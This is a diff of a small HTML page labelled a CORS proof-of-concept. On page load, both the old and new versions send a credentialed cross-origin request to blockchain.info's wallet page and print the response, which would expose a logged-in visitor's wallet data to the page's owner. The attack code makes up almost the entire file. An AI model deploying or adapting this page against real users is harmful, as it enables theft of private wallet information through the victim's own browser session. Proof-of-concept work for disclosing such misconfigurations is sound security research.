@@ -1,21 +1,23 @@
+<!DOCTYPE html>
 <html>
-<head>
+<head><title>CORS</title></head>
+<body onload="cors();">
+<center>
+cors proof-of-concept:<br><br>
+<textarea rows="10" cols="60" id="pwnz">
+</textarea><br>
+</div>
+
 <script>
-{function a(){
-var xmlhttp; 
-  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-  }
-xmlhttp.open("GET","https://blockchain.info/wallet", false);
-xmlhttp.withCredentials = true;
-xmlhttp.send();
-if(xmlhttp.status==200)
-{
-var str=xmlhttp.responseText;
-document.write(decodeURIComponent(str));
-}
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("pwnz").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "http://blockchain.info/wallet/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
 }
 </script>
-</head>
-<body onload=a();>
-</body>
-</html>
